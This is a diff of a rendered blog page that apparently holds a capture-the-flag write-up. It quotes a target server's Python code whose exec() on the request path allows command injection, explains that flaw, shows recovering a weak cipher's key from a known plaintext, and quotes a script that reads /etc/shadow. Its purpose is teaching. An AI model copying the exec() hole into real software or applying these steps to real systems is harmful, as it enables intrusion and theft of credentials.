+            info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output = &#39;Document: {}&#39;&#34;</span> <span style="color:#75715e"># Keep the output for later debug</span>
             <span style="color:#66d9ef">print</span>(info<span style="color:#f92672">.</span>format(path))
             <span style="color:#66d9ef">exec</span>(info<span style="color:#f92672">.</span>format(path)) <span style="color:#75715e"># This is how you do string formatting, right?</span>
             cwd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__))
             docRoot <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(cwd, docRoot)
-            <span style="color:#66d9ef">if</span> path <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/</span><span style="color:#e6db74">&#34;</span>:
-                path <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/index.html</span><span style="color:#e6db74">&#34;</span>
+            <span style="color:#66d9ef">if</span> path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span>:
+                path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/index.html&#34;</span>
             requested <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, path[<span style="color:#ae81ff">1</span>:])
             <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(requested):
                 mime <span style="color:#f92672">=</span> mimetypes<span style="color:#f92672">.</span>guess_type(requested)
-                mime <span style="color:#f92672">=</span> (mime <span style="color:#66d9ef">if</span> mime[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> None <span style="color:#66d9ef">else</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">text/html</span><span style="color:#e6db74">&#34;</span>)
-                mime <span style="color:#f92672">=</span> MIMES[requested<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">.</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]]
+                mime <span style="color:#f92672">=</span> (mime <span style="color:#66d9ef">if</span> mime[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> None <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;text/html&#34;</span>)
+                mime <span style="color:#f92672">=</span> MIMES[requested<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]]
                 <span style="color:#66d9ef">try</span>:
-                    <span style="color:#66d9ef">with</span> open(requested, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">as</span> f:
+                    <span style="color:#66d9ef">with</span> open(requested, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
                         data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
                 <span style="color:#66d9ef">except</span>:
-                    <span style="color:#66d9ef">with</span> open(requested, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">rb</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">as</span> f:
+                    <span style="color:#66d9ef">with</span> open(requested, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
                         data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
-                status <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">200</span><span style="color:#e6db74">&#34;</span>
+                status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;200&#34;</span>
             <span style="color:#66d9ef">else</span>:
-                errorPage <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">errors</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">404.html</span><span style="color:#e6db74">&#34;</span>)
-                mime <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">text/html</span><span style="color:#e6db74">&#34;</span>
-                <span style="color:#66d9ef">with</span> open(errorPage, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">as</span> f:
+                errorPage <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, <span style="color:#e6db74">&#34;errors&#34;</span>, <span style="color:#e6db74">&#34;404.html&#34;</span>)
+                mime <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
+                <span style="color:#66d9ef">with</span> open(errorPage, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
                     data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>format(path)
-                status <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">404</span><span style="color:#e6db74">&#34;</span>
+                status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;404&#34;</span>
         <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
             <span style="color:#66d9ef">print</span>(e)
-            errorPage <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">errors</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">500.html</span><span style="color:#e6db74">&#34;</span>)
-            mime <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">text/html</span><span style="color:#e6db74">&#34;</span>
-            <span style="color:#66d9ef">with</span> open(errorPage, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">as</span> f:
+            errorPage <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, <span style="color:#e6db74">&#34;errors&#34;</span>, <span style="color:#e6db74">&#34;500.html&#34;</span>)
+            mime <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
+            <span style="color:#66d9ef">with</span> open(errorPage, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
                 data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
-            status <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">500</span><span style="color:#e6db74">&#34;</span>
-        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">body</span><span style="color:#e6db74">&#34;</span>: data, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">mime</span><span style="color:#e6db74">&#34;</span>: mime, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">status</span><span style="color:#e6db74">&#34;</span>: status}
+            status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;500&#34;</span>
+        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;body&#34;</span>: data, <span style="color:#e6db74">&#34;mime&#34;</span>: mime, <span style="color:#e6db74">&#34;status&#34;</span>: status}
 </code></pre></div><p>By doing some code-analysis, is possible to see that the function <code>serveDoc()</code> is vulnerable to a command injection in its line <code>exec(info.format(path)) # This is how you do string formatting, right?</code> this is because it&rsquo;s making use of <a href="https://docs.python.org/2.0/ref/exec.html">exec</a> which is not even being sanitized, so in other words&hellip;there is being used a function which executes stuff at OS level while not sanitized, so this is our RCE :)</p>
 <p>Pst: The hyperlink against the doc of <code>exec</code> points to 2.0 because when I did this machine, python 2.x was still alive, and then I just went to read of exec on that version.</p>
 <h2 id="rce">RCE</h2>
@@ -592,85 +566,85 @@ www-data@obscure:/home/robert$ cat passwordreminder.txt
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(text, key):
     keylen <span style="color:#f92672">=</span> len(key)
     keyPos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-    encrypted <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+    encrypted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
     <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> text:
         keyChr <span style="color:#f92672">=</span> key[keyPos]
         newChr <span style="color:#f92672">=</span> ord(x)
         newChr <span style="color:#f92672">=</span> chr((newChr <span style="color:#f92672">+</span> ord(keyChr)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">255</span>)
-        encrypted <span style="color:#f92672">+</span><span style="color:#f92672">=</span> newChr
-        keyPos <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+        encrypted <span style="color:#f92672">+=</span> newChr
+        keyPos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
         keyPos <span style="color:#f92672">=</span> keyPos <span style="color:#f92672">%</span> keylen
     <span style="color:#66d9ef">return</span> encrypted
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(text, key):
     keylen <span style="color:#f92672">=</span> len(key)
     keyPos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-    decrypted <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+    decrypted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
     <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> text:
         keyChr <span style="color:#f92672">=</span> key[keyPos]
         newChr <span style="color:#f92672">=</span> ord(x)
         newChr <span style="color:#f92672">=</span> chr((newChr <span style="color:#f92672">-</span> ord(keyChr)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">255</span>)
-        decrypted <span style="color:#f92672">+</span><span style="color:#f92672">=</span> newChr
-        keyPos <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+        decrypted <span style="color:#f92672">+=</span> newChr
+        keyPos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
         keyPos <span style="color:#f92672">=</span> keyPos <span style="color:#f92672">%</span> keylen
     <span style="color:#66d9ef">return</span> decrypted
 
-parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Encrypt with 0bscura</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s encryption algorithm</span><span style="color:#e6db74">&#39;</span>)
+parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Encrypt with 0bscura</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s encryption algorithm&#39;</span>)
 
-parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-i</span><span style="color:#e6db74">&#39;</span>,
-                    metavar<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">InFile</span><span style="color:#e6db74">&#39;</span>,
+parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-i&#39;</span>,
+                    metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;InFile&#39;</span>,
                     type<span style="color:#f92672">=</span>str,
-                    help<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">The file to read</span><span style="color:#e6db74">&#39;</span>,
+                    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;The file to read&#39;</span>,
                     required<span style="color:#f92672">=</span>False)
 
-parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-o</span><span style="color:#e6db74">&#39;</span>,
-                    metavar<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">OutFile</span><span style="color:#e6db74">&#39;</span>,
+parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-o&#39;</span>,
+                    metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;OutFile&#39;</span>,
                     type<span style="color:#f92672">=</span>str,
-                    help<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Where to output the encrypted/decrypted file</span><span style="color:#e6db74">&#39;</span>,
+                    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Where to output the encrypted/decrypted file&#39;</span>,
                     required<span style="color:#f92672">=</span>False)
 
-parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-k</span><span style="color:#e6db74">&#39;</span>,
-                    metavar<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Key</span><span style="color:#e6db74">&#39;</span>,
+parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-k&#39;</span>,
+                    metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Key&#39;</span>,
                     type<span style="color:#f92672">=</span>str,
-                    help<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Key to use</span><span style="color:#e6db74">&#39;</span>,
+                    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Key to use&#39;</span>,
                     required<span style="color:#f92672">=</span>False)
 
-parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-d</span><span style="color:#e6db74">&#39;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">store_true</span><span style="color:#e6db74">&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Decrypt mode</span><span style="color:#e6db74">&#39;</span>)
+parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-d&#39;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_true&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Decrypt mode&#39;</span>)
 
 args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
 
-banner <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">################################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
-banner<span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#           BEGINNING          #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
-banner<span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#    SUPER SECURE ENCRYPTOR    #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
-banner<span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">################################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
-banner <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">  ############################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
-banner <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">  #        FILE MODE         #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
-banner <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">  ############################</span><span style="color:#e6db74">&#34;</span>
+banner <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;################################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+banner<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;#           BEGINNING          #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+banner<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;#    SUPER SECURE ENCRYPTOR    #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+banner<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;################################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  ############################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  #        FILE MODE         #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  ############################&#34;</span>
 <span style="color:#66d9ef">print</span>(banner)
 <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>o <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>k <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>i <span style="color:#f92672">==</span> None:
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Missing args</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Missing args&#34;</span>)
 <span style="color:#66d9ef">else</span>:
     <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>d:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Opening file {0}...</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
-        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>i, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">UTF-8</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Opening file {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
+        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>i, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
             data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Decrypting...</span><span style="color:#e6db74">&#34;</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Decrypting...&#34;</span>)
         decrypted <span style="color:#f92672">=</span> decrypt(data, args<span style="color:#f92672">.</span>k)
 
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Writing to {0}...</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
-        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>o, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">UTF-8</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Writing to {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
+        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>o, <span style="color:#e6db74">&#39;w&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
             f<span style="color:#f92672">.</span>write(decrypted)
     <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Opening file {0}...</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
-        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>i, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">UTF-8</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Opening file {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
+        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>i, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
             data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Encrypting...</span><span style="color:#e6db74">&#34;</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Encrypting...&#34;</span>)
         encrypted <span style="color:#f92672">=</span> encrypt(data, args<span style="color:#f92672">.</span>k)
 
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Writing to {0}...</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
-        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>o, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">UTF-8</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Writing to {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
+        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>o, <span style="color:#e6db74">&#39;w&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
             f<span style="color:#f92672">.</span>write(encrypted)
 </code></pre></div><p>By analyzing what the code does, one can see that it takes a file as input and a key and ciphers that file, is possible to observe as well we can provide a ciphered file and it&rsquo;s correspondant plain text file in decrypt mode as key, which will give back the key that was used&hellip;
 Then we proceed to execute the script with <code>out.txt</code> as input and <code>check.txt</code> as the key, saving the output (the key), under tmp as <code>foobar</code>:</p>
@@ -729,62 +703,62 @@ drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 ..
 <span style="color:#f92672">import</span> traceback
 <span style="color:#f92672">import</span> subprocess
 
-path <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, k<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))
-session <span style="color:#f92672">=</span> {<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">user</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">authenticated</span><span style="color:#e6db74">&#34;</span>: <span style="color:#ae81ff">0</span>}
+path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, k<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))
+session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;user&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;authenticated&#34;</span>: <span style="color:#ae81ff">0</span>}
 <span style="color:#66d9ef">try</span>:
-    session[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">user</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Enter username: </span><span style="color:#e6db74">&#34;</span>)
-    passW <span style="color:#f92672">=</span> input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Enter password: </span><span style="color:#e6db74">&#34;</span>)
+    session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter username: &#34;</span>)
+    passW <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter password: &#34;</span>)
 
-    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/etc/shadow</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/etc/shadow&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
         data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
-    data <span style="color:#f92672">=</span> [(p<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">:</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> p <span style="color:#66d9ef">else</span> None) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> data]
+    data <span style="color:#f92672">=</span> [(p<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>) <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;$&#34;</span> <span style="color:#f92672">in</span> p <span style="color:#66d9ef">else</span> None) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> data]
     passwords <span style="color:#f92672">=</span> []
     <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> data:
         <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x <span style="color:#f92672">==</span> None:
             passwords<span style="color:#f92672">.</span>append(x)
 
-    passwordFile <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(p) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords]) 
-    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/tmp/SSH/</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>path, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
